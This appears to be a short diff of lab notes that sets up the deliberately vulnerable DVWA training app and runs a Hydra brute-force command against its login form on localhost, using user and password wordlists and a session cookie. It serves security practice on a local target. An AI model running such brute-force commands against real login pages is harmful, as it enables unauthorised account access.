@@ -1,0 +1,4 @@
+git clone https://github.com/digininja/DVWA.git
+sudo docker run -d --name dvwa-mysql -e MYSQL\_ROOT\_PASSWORD=root mysql:latest
+sudo apt-get install hydra-gtk
+hydra -L users.txt -P password_1100.txt "http-get-form://localhost:8080/vulnerabilities/brute/?username=^USER^&password=^PASS^:H=Cookie\:PHPSESSID=ikfgsk7na0dgu2f4qp40p2l9p5; security=low;:F=Username and/or password incorrect." -I -V
